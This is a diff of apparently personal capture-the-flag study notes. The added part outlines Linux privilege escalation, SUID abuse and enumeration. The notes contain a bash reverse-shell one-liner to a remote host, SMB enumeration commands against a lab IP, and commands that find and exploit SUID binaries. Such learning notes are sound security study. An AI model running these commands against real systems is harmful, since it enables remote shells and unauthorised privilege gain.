@@ -174,3 +174,29 @@ bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
 enum4linux 10.10.178.30 | tee e4l.txt
 smbclient //10.10.178.30/tbfc-hr
 ```
+
+# Task 13 - Day 11 - Networking
+* Privilege Escalation
+* Permissions
+  * User
+  * Administrator
+* Types of Escalation
+  * Horizontal - access another user's resources that has the same permissions as you
+  * Vertical - accessing data acting as a higher privileged account
+* Checklists
+  * https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+  * https://payatu.com/guide-linux-privilege-escalation
+  * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
+  * https://gtfobins.github.io/
+* SUID is a permission added to an executable that allows it to execute as the user that owns the executable
+  * find / -perm -u=s -type f 2>/dev/null
+  * /bin/bash -p
+
+* Enumeration beyond nmap
+  * backups
+  * passwords
+  * configuration
+  * LinEnum
+
+* Resources
+  * https://dvwa.co.uk/
